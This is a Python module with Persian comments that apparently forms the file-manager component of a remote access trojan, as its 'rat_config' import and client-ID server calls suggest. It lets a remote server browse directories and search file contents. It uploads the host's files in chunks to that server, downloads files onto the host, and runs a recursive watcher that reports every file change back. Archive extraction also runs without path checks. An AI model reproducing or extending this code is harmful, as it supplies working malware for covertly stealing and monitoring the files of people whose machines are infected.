# system/advanced_file_manager.py
import os
import json
import time
import shutil
import hashlib
import mimetypes
import logging
import tempfile
import zipfile
import tarfile
from typing import Dict, List, Optional, Tuple, Any
from datetime import datetime
import humanize
import magic
from pathlib import Path
from rat_config import Config
from encryption.manager import EncryptionManager
from network.communicator import ServerCommunicator
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler

logger = logging.getLogger("AdvancedFileManager")

class FileSystemEventHandlerCustom(FileSystemEventHandler):
    """Handler برای monitoring تغییرات فایل‌سیستم"""
    
    def __init__(self, file_manager):
        self.file_manager = file_manager
        self.last_event = time.time()
        self.event_buffer = []
        
    def on_modified(self, event):
        if time.time() - self.last_event > 1:  # Debounce 1 ثانیه
            self.last_event = time.time()
            logger.info(f"File modified: {event.src_path}")
            # گزارش به سرور اگر نیاز باشد
            self.file_manager.report_file_change(event.src_path, 'modified')
            
    def on_created(self, event):
        logger.info(f"File created: {event.src_path}")
        self.file_manager.report_file_change(event.src_path, 'created')
        
    def on_deleted(self, event):
        logger.info(f"File deleted: {event.src_path}")
        self.file_manager.report_file_change(event.src_path, 'deleted')

class AdvancedFileManager:
    """File Manager پیشرفته با قابلیت‌های کامل"""
    
    def __init__(self, encryption_manager: EncryptionManager, communicator: ServerCommunicator):
        self.encryption = encryption_manager
        self.communicator = communicator
        self.client_id = Config.get_client_id()
        self.chunk_size = 1024 * 1024  # 1MB chunks
        self.max_upload_size = Config.MAX_FILE_UPLOAD_SIZE
        self.allowed_extensions = Config.ALLOWED_FILE_EXTENSIONS
        
        # File watcher
        self.observer = None
        self.event_handler = None
        self.watched_paths = set()
        
        # Cache برای performance
        self.file_cache = {}
        self.cache_timeout = 300  # 5 دقیقه
        
        logger.info("AdvancedFileManager initialized")
    
    def _get_file_icon(self, file_path: str, is_dir: bool = False) -> str:
        """تعیین آیکون بر اساس نوع فایل"""
        if is_dir:
            return "folder"
        
        ext = os.path.splitext(file_path)[1].lower()
        
        icon_map = {
            # تصاویر
            '.jpg': 'image', '.jpeg': 'image', '.png': 'image',
            '.gif': 'image', '.bmp': 'image', '.svg': 'image',
            '.ico': 'image', '.webp': 'image',
            
            # مستندات
            '.pdf': 'pdf',
            '.doc': 'word', '.docx': 'word',
            '.xls': 'excel', '.xlsx': 'excel',
            '.ppt': 'powerpoint', '.pptx': 'powerpoint',
            
            # متن
            '.txt': 'text', '.log': 'text',
            '.json': 'code', '.xml': 'code',
            '.html': 'code', '.htm': 'code',
            '.js': 'code', '.css': 'code',
            '.py': 'code', '.java': 'code',
            '.cpp': 'code', '.c': 'code',
            '.php': 'code', '.sql': 'code',
            
            # آرشیو
            '.zip': 'archive', '.rar': 'archive',
            '.tar': 'archive', '.gz': 'archive',
            '.7z': 'archive',
            
            # رسانه
            '.mp3': 'audio', '.wav': 'audio',
            '.mp4': 'video', '.avi': 'video',
            '.mkv': 'video', '.mov': 'video',
            
            # اجرایی
            '.exe': 'executable', '.msi': 'executable',
            '.bat': 'script', '.sh': 'script',
            
            # دیگه
            '.iso': 'disk', '.dmg': 'disk',
            '.db': 'database', '.sqlite': 'database',
        }
        
        return icon_map.get(ext, 'file')
    
    def _get_mime_type(self, file_path: str) -> str:
        """دریافت MIME type فایل"""
        try:
            mime = magic.Magic(mime=True)
            return mime.from_file(file_path)
        except:
            # Fallback به mimetypes
            mime_type, _ = mimetypes.guess_type(file_path)
            return mime_type or 'application/octet-stream'
    
    def list_files_advanced(self, path: str, page: int = 1, page_size: int = 50, 
                           sort_by: str = 'name', order: str = 'asc', 
                           show_hidden: bool = False) -> Dict:
        """لیست پیشرفته فایل‌ها با pagination و sorting"""
        
        # Check cache
        cache_key = f"{path}:{page}:{page_size}:{sort_by}:{order}:{show_hidden}"
        if cache_key in self.file_cache:
            cached_data, cached_time = self.file_cache[cache_key]
            if time.time() - cached_time < self.cache_timeout:
                logger.debug(f"Using cache for: {path}")
                return cached_data
        
        try:
            if not os.path.exists(path):
                return {"status": "error", "message": f"Path does not exist: {path}"}
            
            all_items = []
            total_size = 0
            file_count = 0
            dir_count = 0
            
            # خواندن محتوا
            with os.scandir(path) as entries:
                for entry in entries:
                    # Skip hidden files اگر نیاز باشد
                    if not show_hidden and entry.name.startswith('.'):
                        continue
                    
                    try:
                        stat = entry.stat()
                        
                        item = {
                            "name": entry.name,
                            "type": "directory" if entry.is_dir() else "file",
                            "size": stat.st_size if not entry.is_dir() else None,
                            "size_human": humanize.naturalsize(stat.st_size) if not entry.is_dir() else "-",
                            "modified": datetime.fromtimestamp(stat.st_mtime).isoformat(),
                            "modified_timestamp": stat.st_mtime,
                            "permissions": oct(stat.st_mode)[-3:],
                            "owner": stat.st_uid,  # در ویندوز ممکن است متفاوت باشد
                            "group": stat.st_gid,
                            "icon": self._get_file_icon(entry.name, entry.is_dir()),
                            "is_hidden": entry.name.startswith('.'),
                            "is_system": False,  # نیاز به بررسی بیشتر در ویندوز
                            "is_link": entry.is_symlink(),
                            "mime_type": self._get_mime_type(entry.path) if not entry.is_dir() else None,
                            "previewable": self._is_previewable(entry.name) if not entry.is_dir() else False
                        }
                        
                        # محاسبه سایز پوشه (اختیاری - می‌تواند کند باشد)
                        if entry.is_dir():
                            dir_count += 1
                            try:
                                dir_size = sum(f.stat().st_size for f in Path(entry.path).rglob('*') if f.is_file())
                                item["size"] = dir_size
                                item["size_human"] = humanize.naturalsize(dir_size)
                                item["file_count"] = len(list(Path(entry.path).rglob('*')))
                            except:
                                item["file_count"] = 0
                        else:
                            file_count += 1
                            total_size += stat.st_size
                        
                        all_items.append(item)
                        
                    except (PermissionError, OSError) as e:
                        logger.warning(f"Cannot access {entry.path}: {str(e)}")
                        continue
            
            # Sorting
            reverse = order.lower() == 'desc'
            
            if sort_by == 'name':
                all_items.sort(key=lambda x: x['name'].lower(), reverse=reverse)
            elif sort_by == 'size':
                all_items.sort(key=lambda x: x['size'] or 0, reverse=reverse)
            elif sort_by == 'modified':
                all_items.sort(key=lambda x: x['modified_timestamp'], reverse=reverse)
            elif sort_by == 'type':
                all_items.sort(key=lambda x: (x['type'], x['name'].lower()), reverse=reverse)
            
            # Pagination
            start_idx = (page - 1) * page_size
            end_idx = start_idx + page_size
            paginated_items = all_items[start_idx:end_idx]
            
            # جدا کردن فایل‌ها و پوشه‌ها
            files = [item for item in paginated_items if item['type'] == 'file']
            directories = [item for item in paginated_items if item['type'] == 'directory']
            
            # محاسبه فضای آزاد
            try:
                statvfs = os.statvfs(path) if hasattr(os, 'statvfs') else None
                free_space = statvfs.f_bavail * statvfs.f_frsize if statvfs else 0
                total_space = statvfs.f_blocks * statvfs.f_frsize if statvfs else 0
            except:
                free_space = 0
                total_space = 0
            
            result = {
                "status": "success",
                "path": os.path.abspath(path),
                "parent": os.path.dirname(os.path.abspath(path)),
                "files": files,
                "directories": directories,
                "pagination": {
                    "page": page,
                    "page_size": page_size,
                    "total": len(all_items),
                    "total_pages": (len(all_items) + page_size - 1) // page_size
                },
                "statistics": {
                    "total_files": file_count,
                    "total_directories": dir_count,
                    "total_size": total_size,
                    "total_size_human": humanize.naturalsize(total_size),
                    "free_space": free_space,
                    "free_space_human": humanize.naturalsize(free_space),
                    "total_space": total_space,
                    "total_space_human": humanize.naturalsize(total_space)
                }
            }
            
            # ذخیره در cache
            self.file_cache[cache_key] = (result, time.time())
            
            return result
            
        except Exception as e:
            logger.error(f"Error listing files: {str(e)}")
            return {"status": "error", "message": f"Failed to list files: {str(e)}"}
    
    def upload_file_chunked(self, local_path: str, remote_path: str, 
                           chunk_index: int = 0, total_chunks: int = None,
                           callback=None) -> Dict:
        """آپلود فایل به صورت chunked"""
        
        if not os.path.exists(local_path):
            return {"status": "error", "message": f"Local file not found: {local_path}"}
        
        file_size = os.path.getsize(local_path)
        
        # محاسبه total chunks اگر داده نشده
        if total_chunks is None:
            total_chunks = (file_size + self.chunk_size - 1) // self.chunk_size
        
        # بررسی سایز فایل
        if file_size > self.max_upload_size:
            return {"status": "error", "message": f"File too large: {humanize.naturalsize(file_size)} > {humanize.naturalsize(self.max_upload_size)}"}
        
        # بررسی extension
        ext = os.path.splitext(local_path)[1].lower()[1:]  # بدون نقطه
        if ext and self.allowed_extensions and ext not in self.allowed_extensions:
            return {"status": "error", "message": f"File extension .{ext} not allowed"}
        
        try:
            # محاسبه hash فایل
            file_hash = self._calculate_file_hash(local_path)
            
            # خواندن chunk
            with open(local_path, 'rb') as f:
                f.seek(chunk_index * self.chunk_size)
                chunk_data = f.read(self.chunk_size)
            
            chunk_hash = hashlib.sha256(chunk_data).hexdigest()
            
            # ارسال به سرور
            response = self.communicator._send_request(
                "upload_file_chunked",
                data={
                    "client_id": self.client_id,
                    "remote_path": remote_path,
                    "file_name": os.path.basename(local_path),
                    "file_size": file_size,
                    "file_hash": file_hash,
                    "chunk_index": chunk_index,
                    "total_chunks": total_chunks,
                    "chunk_hash": chunk_hash,
                    "chunk_size": len(chunk_data),
                    "is_last_chunk": chunk_index == total_chunks - 1
                }
            )
            
            if callback:
                progress = ((chunk_index + 1) / total_chunks) * 100
                callback(progress, chunk_index + 1, total_chunks)
            
            return {
                "status": "success",
                "message": f"Chunk {chunk_index + 1}/{total_chunks} uploaded",
                "chunk_index": chunk_index,
                "total_chunks": total_chunks,
                "uploaded_bytes": (chunk_index + 1) * len(chunk_data),
                "total_bytes": file_size,
                "next_chunk": chunk_index + 1 if chunk_index + 1 < total_chunks else None
            }
            
        except Exception as e:
            logger.error(f"Error uploading chunk: {str(e)}")
            return {"status": "error", "message": f"Upload failed: {str(e)}"}
    
    def download_file_resumable(self, remote_path: str, local_path: str, 
                               offset: int = 0, callback=None) -> Dict:
        """دانلود فایل با قابلیت resume"""
        
        try:
            # بررسی فایل موجود
            if os.path.exists(local_path):
                current_size = os.path.getsize(local_path)
                if offset == 0:  # اگر offset داده نشده، از ادامه فایل شروع کن
                    offset = current_size
            
            # درخواست دانلود از سرور
            response = self.communicator._send_request(
                "download_file_resumable",
                data={
                    "client_id": self.client_id,
                    "remote_path": remote_path,
                    "offset": offset,
                    "chunk_size": self.chunk_size
                }
            )
            
            if not response or 'error' in response:
                return {"status": "error", "message": response.get('error', 'Download failed')}
            
            # دریافت داده
            file_data = response.get('data', b'')
            total_size = response.get('total_size', 0)
            new_offset = offset + len(file_data)
            
            # ذخیره داده
            mode = 'ab' if offset > 0 else 'wb'
            with open(local_path, mode) as f:
                f.write(file_data)
            
            if callback:
                progress = (new_offset / total_size) * 100 if total_size > 0 else 0
                callback(progress, new_offset, total_size)
            
            return {
                "status": "success",
                "message": f"Downloaded {len(file_data)} bytes",
                "offset": new_offset,
                "total_size": total_size,
                "completed": new_offset >= total_size,
                "local_path": local_path
            }
            
        except Exception as e:
            logger.error(f"Error downloading file: {str(e)}")
            return {"status": "error", "message": f"Download failed: {str(e)}"}
    
    def search_files(self, root_path: str, pattern: str, 
                    search_type: str = 'name', max_results: int = 100,
                    case_sensitive: bool = False) -> Dict:
        """جستجوی پیشرفته فایل‌ها"""
        
        if not os.path.exists(root_path):
            return {"status": "error", "message": f"Root path not found: {root_path}"}
        
        try:
            results = []
            start_time = time.time()
            
            if not case_sensitive:
                pattern = pattern.lower()
            
            for root, dirs, files in os.walk(root_path):
                # بررسی timeout (حداکثر 30 ثانیه)
                if time.time() - start_time > 30:
                    logger.warning("Search timeout after 30 seconds")
                    break
                
                for file in files:
                    file_path = os.path.join(root, file)
                    rel_path = os.path.relpath(file_path, root_path)
                    
                    match = False
                    
                    if search_type == 'name':
                        if case_sensitive:
                            match = pattern in file
                        else:
                            match = pattern in file.lower()
                    
                    elif search_type == 'content':
                        try:
                            # فقط فایل‌های متنی
                            if self._is_text_file(file_path):
                                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                    content = f.read()
                                    if case_sensitive:
                                        match = pattern in content
                                    else:
                                        match = pattern in content.lower()
                        except:
                            continue
                    
                    elif search_type == 'extension':
                        ext = os.path.splitext(file)[1].lower()
                        match = f".{pattern}" == ext
                    
                    if match:
                        try:
                            stat = os.stat(file_path)
                            results.append({
                                "path": file_path,
                                "relative_path": rel_path,
                                "name": file,
                                "size": stat.st_size,
                                "size_human": humanize.naturalsize(stat.st_size),
                                "modified": datetime.fromtimestamp(stat.st_mtime).isoformat(),
                                "type": "file",
                                "icon": self._get_file_icon(file_path, False)
                            })
                            
                            if len(results) >= max_results:
                                break
                        except:
                            continue
                
                if len(results) >= max_results:
                    break
            
            return {
                "status": "success",
                "search_term": pattern,
                "search_type": search_type,
                "results": results,
                "count": len(results),
                "search_time": time.time() - start_time,
                "root_path": root_path
            }
            
        except Exception as e:
            logger.error(f"Error searching files: {str(e)}")
            return {"status": "error", "message": f"Search failed: {str(e)}"}
    
    def compress_files(self, file_paths: List[str], archive_path: str, 
                      format: str = 'zip') -> Dict:
        """فشرده‌سازی فایل‌ها"""
        
        try:
            if format == 'zip':
                with zipfile.ZipFile(archive_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                    for file_path in file_paths:
                        if os.path.exists(file_path):
                            arcname = os.path.basename(file_path)
                            zipf.write(file_path, arcname)
            
            elif format == 'tar':
                with tarfile.open(archive_path, 'w') as tar:
                    for file_path in file_paths:
                        if os.path.exists(file_path):
                            arcname = os.path.basename(file_path)
                            tar.add(file_path, arcname)
            
            archive_size = os.path.getsize(archive_path)
            
            return {
                "status": "success",
                "message": f"Compressed {len(file_paths)} files to {archive_path}",
                "archive_path": archive_path,
                "archive_size": archive_size,
                "archive_size_human": humanize.naturalsize(archive_size),
                "format": format,
                "file_count": len(file_paths)
            }
            
        except Exception as e:
            logger.error(f"Error compressing files: {str(e)}")
            return {"status": "error", "message": f"Compression failed: {str(e)}"}
    
    def extract_archive(self, archive_path: str, dest_path: str) -> Dict:
        """استخراج آرشیو"""
        
        if not os.path.exists(archive_path):
            return {"status": "error", "message": f"Archive not found: {archive_path}"}
        
        try:
            extracted_files = []
            
            if archive_path.lower().endswith('.zip'):
                with zipfile.ZipFile(archive_path, 'r') as zipf:
                    zipf.extractall(dest_path)
                    extracted_files = zipf.namelist()
            
            elif archive_path.lower().endswith('.tar') or archive_path.lower().endswith('.tar.gz'):
                with tarfile.open(archive_path, 'r') as tar:
                    tar.extractall(dest_path)
                    extracted_files = tar.getnames()
            
            return {
                "status": "success",
                "message": f"Extracted {len(extracted_files)} files to {dest_path}",
                "dest_path": dest_path,
                "extracted_count": len(extracted_files),
                "extracted_files": extracted_files[:20]  # فقط 20 تای اول
            }
            
        except Exception as e:
            logger.error(f"Error extracting archive: {str(e)}")
            return {"status": "error", "message": f"Extraction failed: {str(e)}"}
    
    def find_duplicate_files(self, root_path: str, 
                            compare_by: str = 'hash') -> Dict:
        """پیدا کردن فایل‌های تکراری"""
        
        try:
            file_hashes = {}
            duplicates = []
            start_time = time.time()
            
            for root, dirs, files in os.walk(root_path):
                for file in files:
                    file_path = os.path.join(root, file)
                    
                    try:
                        if compare_by == 'hash':
                            file_hash = self._calculate_file_hash(file_path)
                        elif compare_by == 'size_name':
                            stat = os.stat(file_path)
                            file_hash = f"{stat.st_size}_{file}"
                        else:  # size only
                            stat = os.stat(file_path)
                            file_hash = str(stat.st_size)
                        
                        if file_hash in file_hashes:
                            duplicates.append({
                                "original": file_hashes[file_hash],
                                "duplicate": file_path,
                                "hash": file_hash if compare_by == 'hash' else None,
                                "size": stat.st_size
                            })
                        else:
                            file_hashes[file_hash] = file_path
                    
                    except (PermissionError, OSError):
                        continue
            
            # گروه‌بندی duplicates
            grouped_duplicates = {}
            for dup in duplicates:
                key = dup['original']
                if key not in grouped_duplicates:
                    grouped_duplicates[key] = []
                grouped_duplicates[key].append(dup['duplicate'])
            
            total_size_saved = sum(dup['size'] for dup in duplicates)
            
            return {
                "status": "success",
                "duplicates": grouped_duplicates,
                "total_duplicates": len(duplicates),
                "total_groups": len(grouped_duplicates),
                "total_size_saved": total_size_saved,
                "total_size_saved_human": humanize.naturalsize(total_size_saved),
                "search_time": time.time() - start_time,
                "compare_method": compare_by
            }
            
        except Exception as e:
            logger.error(f"Error finding duplicates: {str(e)}")
            return {"status": "error", "message": f"Duplicate search failed: {str(e)}"}
    
    def start_file_watcher(self, path: str):
        """شروع monitoring تغییرات فایل‌سیستم"""
        
        if self.observer is None:
            self.observer = Observer()
            self.event_handler = FileSystemEventHandlerCustom(self)
        
        if path not in self.watched_paths:
            self.observer.schedule(self.event_handler, path, recursive=True)
            self.watched_paths.add(path)
            
            if not self.observer.is_alive():
                self.observer.start()
            
            logger.info(f"Started watching path: {path}")
    
    def stop_file_watcher(self, path: str = None):
        """توقف monitoring"""
        
        if path and path in self.watched_paths:
            # توقف watch برای path خاص
            self.watched_paths.remove(path)
            logger.info(f"Stopped watching path: {path}")
        
        if not self.watched_paths and self.observer:
            self.observer.stop()
            self.observer.join()
            self.observer = None
            logger.info("Stopped all file watchers")
    
    def report_file_change(self, file_path: str, change_type: str):
        """گزارش تغییر فایل به سرور"""
        
        try:
            self.communicator._send_request(
                "report_file_change",
                data={
                    "client_id": self.client_id,
                    "file_path": file_path,
                    "change_type": change_type,
                    "timestamp": datetime.now().isoformat()
                }
            )
        except Exception as e:
            logger.warning(f"Failed to report file change: {str(e)}")
    
    def _calculate_file_hash(self, file_path: str, algorithm: str = 'sha256') -> str:
        """محاسبه hash فایل"""
        
        hash_func = hashlib.new(algorithm)
        
        try:
            with open(file_path, 'rb') as f:
                for chunk in iter(lambda: f.read(4096), b''):
                    hash_func.update(chunk)
            return hash_func.hexdigest()
        except:
            return ""
    
    def _is_text_file(self, file_path: str) -> bool:
        """بررسی اینکه آیا فایل متنی است"""
        
        text_extensions = ['.txt', '.log', '.json', '.xml', '.html', '.htm', 
                          '.js', '.css', '.py', '.java', '.cpp', '.c', 
                          '.php', '.sql', '.md', '.csv', '.ini', '.cfg']
        
        ext = os.path.splitext(file_path)[1].lower()
        return ext in text_extensions
    
    def _is_previewable(self, file_name: str) -> bool:
        """بررسی اینکه آیا فایل قابل preview است"""
        
        previewable_extensions = ['.txt', '.log', '.json', '.xml', '.html', '.htm',
                                 '.js', '.css', '.py', '.md', '.csv', '.ini', '.cfg',
                                 '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.svg',
                                 '.pdf']
        
        ext = os.path.splitext(file_name)[1].lower()
        return ext in previewable_extensions
    
    def get_file_preview(self, file_path: str, max_lines: int = 50, 
                        max_size: int = 1024 * 100) -> Dict:
        """دریافت preview فایل"""
        
        if not os.path.exists(file_path):
            return {"status": "error", "message": "File not found"}
        
        try:
            file_size = os.path.getsize(file_path)
            mime_type = self._get_mime_type(file_path)
            
            result = {
                "status": "success",
                "file_path": file_path,
                "file_size": file_size,
                "mime_type": mime_type,
                "is_binary": not self._is_text_file(file_path)
            }
            
            # برای فایل‌های متنی کوچک
            if self._is_text_file(file_path) and file_size <= max_size:
                try:
                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                        lines = []
                        for i, line in enumerate(f):
                            if i >= max_lines:
                                lines.append("... (truncated)")
                                break
                            lines.append(line.rstrip())
                    
                    result["preview"] = "\n".join(lines)
                    result["total_lines"] = i + 1 if i < max_lines else "many"
                
                except:
                    result["preview"] = "[Binary content or encoding error]"
            
            # برای تصاویر - فقط اطلاعات metadata
            elif mime_type.startswith('image/'):
                result["type"] = "image"
                try:
                    from PIL import Image
                    with Image.open(file_path) as img:
                        result["image_info"] = {
                            "format": img.format,
                            "mode": img.mode,
                            "size": img.size,
                            "width": img.width,
                            "height": img.height
                        }
                except:
                    result["image_info"] = {"error": "Could not read image"}
            
            return result
            
        except Exception as e:
            logger.error(f"Error getting file preview: {str(e)}")
            return {"status": "error", "message": f"Preview failed: {str(e)}"}